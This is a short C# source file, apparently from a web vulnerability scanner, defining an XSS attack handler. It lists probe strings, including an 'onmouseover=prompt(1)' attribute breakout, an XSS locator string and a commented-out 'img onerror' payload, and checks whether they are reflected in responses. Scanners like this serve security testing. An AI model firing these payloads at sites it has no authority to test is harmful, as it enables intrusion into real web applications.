using Samadhi.Attack.Common;
using Samadhi.Data;
using Samadhi.History.Data;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Samadhi.Attack.XSS
{
    public class AttackHandler : ParentAttackHandler
    {
        public override bool Validate(AttackHistory attack, Request request)
        {
            if (request.Response.Body.Contains(attack.Verification))
                return true;
            return false;
        }

        public AttackHandler()
        {
            //Attacks.Add(new AttackModel("\">'><img src=x onerror=prompt(1)>", "<img src=x onerror=prompt(1)>", 8, "XSS"));
            Attacks.Add(new AttackModel("'|test|'", "'|test|'", 8, "XSS"));
            Attacks.Add(new AttackModel("\" onmouseover=prompt(1) data=\"", "\" onmouseover=prompt(1)", 8, "XSS"));
            Attacks.Add(new AttackModel("'';!--\"<XSS>=&{()}", "'';!--\"<XSS>=&{()}", 8, "XSS"));
        }
    }
}